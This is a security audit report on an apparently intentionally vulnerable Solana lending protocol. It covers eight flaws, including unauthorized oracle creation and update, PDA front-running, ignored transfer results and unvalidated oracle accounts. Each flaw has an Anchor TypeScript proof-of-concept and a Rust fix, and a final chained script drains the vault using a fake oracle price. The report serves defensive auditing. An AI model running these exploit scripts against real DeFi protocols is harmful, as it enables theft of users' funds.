# Security Audit Report: Vulnerable DeFi Protocol

## Executive Summary

This security audit identified **8 critical/high severity vulnerabilities** in a Solana DeFi lending protocol built with Anchor. These vulnerabilities can be chained together to achieve complete protocol drainage with minimal attacker investment.

---

## Table of Contents

1. [Vulnerability #1: Unauthorized Oracle Creation](#vulnerability-1-unauthorized-oracle-creation)
2. [Vulnerability #2: PDA Collision via Predictable Seeds](#vulnerability-2-pda-collision-via-predictable-seeds)
3. [Vulnerability #3: Missing Balance Subtraction](#vulnerability-3-missing-balance-subtraction)
4. [Vulnerability #4: Unverified Token Transfer](#vulnerability-4-unverified-token-transfer)
5. [Vulnerability #5: Missing Signer Seeds in CPI](#vulnerability-5-missing-signer-seeds-in-cpi)
6. [Vulnerability #6: No PDA Verification in Withdraw](#vulnerability-6-no-pda-verification-in-withdraw)
7. [Vulnerability #7: Unauthorized Oracle Update](#vulnerability-7-unauthorized-oracle-update)
8. [Vulnerability #8: AccountInfo Oracle Bypass](#vulnerability-8-accountinfo-oracle-bypass)
9. [Complete Exploit Chain](#complete-exploit-chain)
10. [Summary](#summary)

---

## Vulnerability #1: Unauthorized Oracle Creation

**Severity**: Critical  
**Location**: `lib.rs:18-26` (`create_oracle` function), `lib.rs:261-268` (`CreateOracle` struct)

**Description**:  
The `create_oracle` function allows any user to create an oracle account and become its authority without any whitelist or authorization check. There is no verification that the caller is authorized to create price oracles, meaning attackers can freely create oracles with arbitrary prices.

**Impact**:  
An attacker can create oracles with manipulated prices (e.g., 1,000,000,000x the real price) and use them in lending operations. When combined with other vulnerabilities, this enables complete protocol drainage by inflating collateral value and borrowing the entire vault.

**Proof of Concept** (test file: `tests/poc1_unauthorized_oracle_creation.ts`):
```typescript
it("Attacker creates oracle without authorization", async () => {
  const attackerOracle = anchor.web3.Keypair.generate();
  
  // Attacker creates oracle with fake price - NO AUTHORIZATION REQUIRED
  await program.methods
    .createOracle(new anchor.BN(1_000_000_000)) // Fake high price
    .accounts({
      oracle: attackerOracle.publicKey,
      signer: attacker.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .signers([attacker, attackerOracle])
    .rpc();
  
  const oracleData = await program.account.oracle.fetch(attackerOracle.publicKey);
  assert.equal(oracleData.authority.toString(), attacker.publicKey.toString());
  //  Attacker now controls an oracle with any price they choose
});
```

**Recommendation**:
```rust
pub fn create_oracle(ctx: Context<CreateOracle>, price: u64) -> Result<()> {
    // Add whitelist check
    require!(
        ctx.accounts.config.authorized_oracle_creators.contains(&ctx.accounts.signer.key()),
        ErrorCode::Unauthorized
    );
    // ... rest of function
}
```

---

## Vulnerability #2: PDA Collision via Predictable Seeds

**Severity**: High  
**Location**: `lib.rs:271-298` (`CreateMarket` struct), seeds at `lib.rs:280-286`

**Description**:  
The market PDA uses predictable seeds (`market`, `market_id`, `supply_mint`, `collateral_mint`) that can be calculated off-chain. An attacker can front-run legitimate market creation by computing the expected PDA and creating the market first with malicious parameters including their own oracle.

**Impact**:  
An attacker can monitor the mempool for pending `create_market` transactions, calculate the predictable PDA, and front-run with their own transaction. This allows the attacker to control market parameters including which oracle is used, effectively taking over the market before legitimate creation.

**Proof of Concept** (test file: `tests/poc2_pda_collision.ts`):
```typescript
it("Attacker can front-run and control market PDA", async () => {
  const marketId = new anchor.BN(1);
  
  // Calculate predictable PDA - same calculation anyone can do
  const [marketPDA] = anchor.web3.PublicKey.findProgramAddressSync(
    [
      Buffer.from("market"),
      marketId.toArrayLike(Buffer, "le", 8),
      supplyMint.toBuffer(),
      collateralMint.toBuffer(),
    ],
    program.programId
  );
  
  // Attacker creates their own malicious oracle
  const attackerOracle = anchor.web3.Keypair.generate();
  await program.methods
    .createOracle(new anchor.BN(1_000_000))
    .accounts({
      oracle: attackerOracle.publicKey,
      signer: attacker.publicKey,
    })
    .signers([attacker, attackerOracle])
    .rpc();
  
  // Attacker front-runs and creates market with THEIR oracle
  await program.methods
    .createMarket(marketId)
    .accounts({
      market: marketPDA,
      supplyOracle: attackerOracle.publicKey,  // Attacker's oracle!
      authority: attacker.publicKey,
      // ...
    })
    .signers([attacker])
    .rpc();
  // ✅ Attacker now controls the market's oracle
});
```

**Recommendation**:
```rust
// Include creator's pubkey or a nonce in seeds to prevent collision
seeds = [
    b"market",
    market_id.to_le_bytes().as_ref(),
    authority.key().as_ref(),  // Include creator
    supply_mint.key().as_ref(),
    collateral_mint.key().as_ref()
]
// Or restrict market creation to authorized accounts only
```

---

## Vulnerability #3: Missing Balance Subtraction

**Severity**: Critical  
**Location**: `lib.rs:66-103` (`supply` function)

**Description**:  
The `supply` function increments the user's cToken balance (`user_supply.ctoken_balance += ctoken_amount`) without proper accounting verification. There's no internal balance tracking that gets decremented, meaning the protocol only tracks additions but cannot verify the user actually deposited tokens.

**Impact**:  
Combined with the unverified transfer vulnerability (#4), this enables infinite cToken minting. The protocol has no way to verify that actual value was received before crediting the user's position.

**Proof of Concept** (test file: `tests/poc3_4_unverified_supply_and_ctoken_mint.ts`):
```typescript
it("User receives cTokens without proper balance accounting", async () => {
  await program.methods
    .supply(new anchor.BN(500))
    .accounts({
      market: marketPDA,
      userSupplyAccount: userSupplyPDA,
      userTokenAccount: attackerTokenAccount,
      vault: vault,
      user: attacker.publicKey,
      tokenProgram: TOKEN_PROGRAM_ID,
    })
    .signers([attacker])
    .rpc();
  
  const userSupplyData = await program.account.userSupplyAccount.fetch(userSupplyPDA);
  // User credited without verification of actual balance change
  console.log("cToken Balance:", userSupplyData.ctokenBalance.toString());
  // ✅ No subtraction from any tracked balance - only addition
});
```

**Recommendation**:
```rust
// Implement double-entry accounting
let before_balance = ctx.accounts.user_token_account.amount;
token::transfer(cpi_ctx, amount)?;
ctx.accounts.user_token_account.reload()?;
let after_balance = ctx.accounts.user_token_account.amount;
require!(before_balance - after_balance == amount, ErrorCode::TransferFailed);
```

---

## Vulnerability #4: Unverified Token Transfer

**Severity**: Critical  
**Location**: `lib.rs:88-90` (`supply` function)

**Description**:  
The token transfer result is intentionally ignored using `let _ = token::transfer(cpi_ctx, amount);`. This suppresses any errors from the transfer, meaning cToken minting proceeds regardless of whether the actual token transfer succeeded.

**Impact**:  
An attacker could potentially receive cTokens without successfully transferring underlying tokens. The function continues and credits the user's cToken balance even if the transfer fails. This allows phantom deposits that appear credited but have no real backing.

**Proof of Concept** (test file: `tests/poc3_4_unverified_supply_and_ctoken_mint.ts`):
```typescript
it("Transfer failure doesn't prevent cToken minting", async () => {
  const beforeBalance = await getAccount(provider.connection, attackerTokenAccount);
  
  // Even if transfer could fail in certain edge cases, cTokens are minted
  await program.methods
    .supply(new anchor.BN(500))
    .accounts({
      market: marketPDA,
      userSupplyAccount: userSupplyPDA,
      userTokenAccount: attackerTokenAccount,
      vault: vault,
      user: attacker.publicKey,
    })
    .signers([attacker])
    .rpc();
  
  const userSupplyData = await program.account.userSupplyAccount.fetch(userSupplyPDA);
  // ✅ User receives cTokens - transfer result is IGNORED with `let _ = `
});
```

**Recommendation**:
```rust
// Always propagate transfer errors using `?`
token::transfer(cpi_ctx, amount)?;  // Will return error if transfer fails
```

---

## Vulnerability #5: Missing Signer Seeds in CPI

**Severity**: High  
**Location**: `lib.rs:124-142` (`withdraw` function), `lib.rs:179-195` (`borrow` function)

**Description**:  
The `withdraw` and `borrow` functions use `CpiContext::new()` instead of `CpiContext::new_with_signer()` for vault transfers. Since the vault is owned by the market PDA, the transfer requires the PDA to sign. Without signer seeds, the transfer will fail.

**Impact**:  
This creates a "honey pot" situation where users can deposit funds but legitimate withdrawals fail. Funds become locked in the vault. An attacker who controls the vault account directly (if vault ownership is misconfigured) could steal all funds.

**Proof of Concept** (test file: `tests/poc5_missing_signer_seeds.ts`):
```typescript
it("Withdrawal fails without proper PDA signer", async () => {
  // Supply tokens first
  await program.methods.supply(new anchor.BN(500))
    .accounts({/* ... */})
    .signers([attacker])
    .rpc();
  
  try {
    await program.methods
      .withdraw(new anchor.BN(100))
      .accounts({
        market: marketPDA,
        userSupplyAccount: userSupplyPDA,
        vault: vault,
        user: attacker.publicKey,
      })
      .signers([attacker])
      .rpc();
    
    console.log("Should have failed!");
  } catch (e) {
    // ✅ Expected: Transaction fails - CpiContext missing signer seeds
    console.log("Withdrawal fails - no PDA signature available");
  }
});
```

**Recommendation**:
```rust
let market_seeds = &[
    b"market",
    market.market_id.to_le_bytes().as_ref(),
    market.supply_mint.as_ref(),
    market.collateral_mint.as_ref(),
    &[ctx.bumps.market],
];

let cpi_ctx = CpiContext::new_with_signer(
    ctx.accounts.token_program.to_account_info(),
    transfer_accounts,
    &[market_seeds],
);
token::transfer(cpi_ctx, token_amount)?;
```

---

## Vulnerability #6: No PDA Verification in Withdraw

**Severity**: High  
**Location**: `lib.rs:107-145` (`withdraw` function), `lib.rs:300-317` (`Withdraw` struct)

**Description**:  
The `withdraw` function does not verify that the provided market account matches the expected PDA derivation. The market is accepted as `Account<'info, Market>` without seeds constraint in the `Withdraw` struct, allowing an attacker to substitute a fake market account.

**Impact**:  
An attacker can create a fake market with inflated user balances, then call withdraw using the legitimate vault but their fake market. This allows over-withdrawal because the fake market claims the user has more cTokens than they actually deposited.

**Proof of Concept** (test file: `tests/poc6_no_pda_verification_withdraw.ts`):
```typescript
it("Attacker creates fake market PDA to manipulate balances", async () => {
  // Create legitimate market
  const [legitMarketPDA] = anchor.web3.PublicKey.findProgramAddressSync([...], program.programId);
  await program.methods.createMarket(marketId).accounts({market: legitMarketPDA, /*...*/}).rpc();
  
  // Create FAKE market with different ID (attacker controls this)
  const fakeMarketId = new anchor.BN(999);
  const [fakeMarketPDA] = anchor.web3.PublicKey.findProgramAddressSync(
    [Buffer.from("market"), fakeMarketId.toArrayLike(Buffer, "le", 8), ...],
    program.programId
  );
  
  await program.methods
    .createMarket(fakeMarketId)
    .accounts({
      market: fakeMarketPDA,
      vault: fakeVault,  // Attacker's vault
      authority: attacker.publicKey,
    })
    .signers([attacker])
    .rpc();
  
  // ✅ Attacker now has a fake market they control
  // Could attempt to use in withdraw with real vault if no validation
});
```

**Recommendation**:
```rust
#[derive(Accounts)]
pub struct Withdraw<'info> {
    #[account(
        mut,
        seeds = [
            b"market",
            market.market_id.to_le_bytes().as_ref(),
            market.supply_mint.as_ref(),
            market.collateral_mint.as_ref()
        ],
        bump
    )]
    pub market: Account<'info, Market>,
    // ...
}
```

---

## Vulnerability #7: Unauthorized Oracle Update

**Severity**: Critical  
**Location**: `lib.rs:29-36` (`update_oracle` function), `lib.rs:270-274` (`UpdateOracle` struct)

**Description**:  
The `update_oracle` function accepts any signer as the "authority" without verifying they are the actual oracle authority stored in `oracle.authority`. The authority constraint is just `Signer<'info>` with no validation against the oracle's authority field.

**Impact**:  
Any user can update any oracle's price. An attacker can manipulate legitimate oracles created by trusted parties, changing prices from realistic values to arbitrary amounts. This affects all lending operations that rely on these oracles.

**Proof of Concept** (test file: `tests/poc7_unauthorized_oracle_update.ts`):
```typescript
it("Any signer can update any oracle", async () => {
  // Victim creates legitimate oracle
  const victimOracle = anchor.web3.Keypair.generate();
  await program.methods
    .createOracle(new anchor.BN(100))  // Real price
    .accounts({
      oracle: victimOracle.publicKey,
      signer: victim.publicKey,
    })
    .signers([victim, victimOracle])
    .rpc();
  
  // Attacker updates victim's oracle without authorization!
  await program.methods
    .updateOracle(new anchor.BN(999_999_999))  // Manipulated price
    .accounts({
      oracle: victimOracle.publicKey,
      authority: attacker.publicKey,  // Attacker signs, NOT the real authority
    })
    .signers([attacker])
    .rpc();
  
  const oracleData = await program.account.oracle.fetch(victimOracle.publicKey);
  assert.equal(oracleData.price.toString(), "999999999");
  // ✅ Attacker manipulated victim's oracle!
});
```

**Recommendation**:
```rust
#[derive(Accounts)]
pub struct UpdateOracle<'info> {
    #[account(
        mut,
        has_one = authority @ ErrorCode::Unauthorized
    )]
    pub oracle: Account<'info, Oracle>,
    pub authority: Signer<'info>,  // Now validated against oracle.authority
}
```

---

## Vulnerability #8: AccountInfo Oracle Bypass

**Severity**: Critical  
**Location**: `lib.rs:289-293` (`CreateMarket` struct - oracle accounts)

**Description**:  
The `CreateMarket` context uses `AccountInfo<'info>` for oracle accounts instead of `Account<'info, Oracle>`. This bypasses Anchor's automatic deserialization and type validation, allowing any account (including random keypairs) to be passed as an oracle.

**Impact**:  
An attacker can create a market with any arbitrary public key as the "oracle" - it doesn't need to be a real Oracle account at all. The market stores this fake oracle's pubkey, and later operations that attempt to read price data may get garbage data or fail entirely.

**Proof of Concept** (test file: `tests/poc8_accountinfo_oracle_bypass.ts`):
```typescript
it("Attacker supplies fake oracle (any account) during market creation", async () => {
  const fakeOracle = anchor.web3.Keypair.generate();
  // Note: fakeOracle is never initialized as an Oracle account!
  
  await program.methods
    .createMarket(marketId)
    .accounts({
      market: marketPDA,
      supplyOracle: fakeOracle.publicKey,     // Not a real Oracle!
      collateralOracle: fakeOracle.publicKey, // Just a random pubkey
      authority: attacker.publicKey,
    })
    .signers([attacker])
    .rpc();
  
  const marketData = await program.account.market.fetch(marketPDA);
  assert.equal(marketData.supplyOracle.toString(), fakeOracle.publicKey.toString());
  // ✅ Market created with fake "oracle" that isn't actually an Oracle account
});
```

**Recommendation**:
```rust
#[derive(Accounts)]
pub struct CreateMarket<'info> {
    // Use proper Account type for automatic validation
    pub supply_oracle: Account<'info, Oracle>,
    pub collateral_oracle: Account<'info, Oracle>,
    // ...
}
```

---

## Complete Exploit Chain

**Severity**: Critical  
**Location**: Multiple files - combines vulnerabilities #1, #3, #4, #8

**Description**:  
All vulnerabilities can be chained for complete protocol drainage:

1. Create fake oracle with inflated price (Vuln #1)
2. Create market using fake oracle via AccountInfo bypass (Vuln #8)
3. Supply minimal collateral (1 token) with unverified transfer (Vuln #3, #4)
4. Borrow massive amount using inflated oracle price

**Impact**:  
Complete loss of all protocol funds. With 1 token of collateral and a fake oracle price of 1,000,000,000,000, an attacker's collateral appears worth trillions, allowing them to borrow the entire vault.

**Proof of Concept** (test file: `tests/poc_chain_full_drain.ts`):
```typescript
it("Full attack chain: Drain protocol", async () => {
  // Step 1: Create fake oracle with inflated price
  const fakeOracle = anchor.web3.Keypair.generate();
  await program.methods
    .createOracle(new anchor.BN(1_000_000_000_000)) // 1 trillion
    .accounts({
      oracle: fakeOracle.publicKey,
      signer: attacker.publicKey,
    })
    .signers([attacker, fakeOracle])
    .rpc();
  
  // Step 2: Create market with fake oracle
  await program.methods
    .createMarket(marketId)
    .accounts({
      market: marketPDA,
      supplyOracle: fakeOracle.publicKey,
      collateralOracle: fakeOracle.publicKey,
      vault: vault,
      authority: attacker.publicKey,
    })
    .signers([attacker])
    .rpc();
  
  // Step 3: Supply only 1 token as collateral
  await program.methods
    .supply(new anchor.BN(1))
    .accounts({
      market: marketPDA,
      userSupplyAccount: userSupplyPDA,
      user: attacker.publicKey,
    })
    .signers([attacker])
    .rpc();
  
  // Step 4: Borrow 50,000,000 tokens with 1 token collateral!
  // max_borrow = 1 * 1,000,000,000,000 * 80 / 100 = 800,000,000,000
  await program.methods
    .borrow(new anchor.BN(50_000_000))
    .accounts({
      market: marketPDA,
      supplyOracle: fakeOracle.publicKey,
      vault: vault,
      user: attacker.publicKey,
    })
    .signers([attacker])
    .rpc();
  
  // ✅ Protocol drained with minimal collateral!
});
```

---

## Summary

| # | Vulnerability | Severity | Impact |
|---|--------------|----------|--------|
| 1 | Unauthorized Oracle Creation | **Critical** | Price manipulation, protocol drainage |
| 2 | PDA Collision via Predictable Seeds | **High** | Market takeover via front-running |
| 3 | Missing Balance Subtraction | **Critical** | Infinite cToken minting |
| 4 | Unverified Token Transfer | **Critical** | Phantom deposits, fund theft |
| 5 | Missing Signer Seeds in CPI | **High** | Locked funds / potential theft |
| 6 | No PDA Verification in Withdraw | **High** | Vault draining via fake market |
| 7 | Unauthorized Oracle Update | **Critical** | Any user can manipulate any oracle |
| 8 | AccountInfo Oracle Bypass | **Critical** | Fake oracle injection |


## Recommendations Summary

1. **Access Control**: Implement proper whitelist checks for sensitive operations (oracle creation, market creation)
2. **Type Safety**: Use `Account<T>` types instead of `AccountInfo` for typed validation
3. **PDA Verification**: Always verify PDA derivation matches expected values using seeds constraints
4. **Error Handling**: Check CPI return values and use `?` operator for error propagation
5. **PDA Signing**: Use `CpiContext::new_with_signer()` for PDA-signed transfers
6. **Authority Validation**: Implement `has_one` constraints for authority validation
7. **Testing**: Add comprehensive integration tests for security-critical paths
8. **Formal Verification**: Consider formal verification for financial logic


*Report generated: December 12, 2025*
